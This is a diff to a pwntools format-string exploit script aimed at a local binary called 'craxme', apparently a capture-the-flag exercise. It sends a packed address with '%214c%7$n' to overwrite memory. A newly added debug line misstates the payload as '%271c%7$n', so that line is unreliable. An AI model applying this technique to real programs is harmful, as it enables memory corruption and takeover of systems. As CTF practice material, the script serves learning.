@@ -12,19 +12,23 @@ p = process("./craxme")
 p.recvuntil("Give me magic :")
 
 magic = 0x804a038
-targat = 0xda
+write = 0xda
 
 print "========= DEBUG ========="
-print "target = ", magic
-print "write = ", targat
-print "hex(write) = ", hex(targat)
-print "before already padding = ", 
+print "Padded before padding  = 4byte"
+print "Distance to fmt_buf = 7args"
+print "targetBuf_address = ", hex(magic)
+print "write = ", write
+print "hex(write) = ", hex(write)
+print "payload = %271c%7$n"
+print "=========================\n"
+
 payload = flat([magic])
 payload += "%214c%7$n"
 
 p.sendline(payload)
 p.interactive()
 
-    
+
 
 
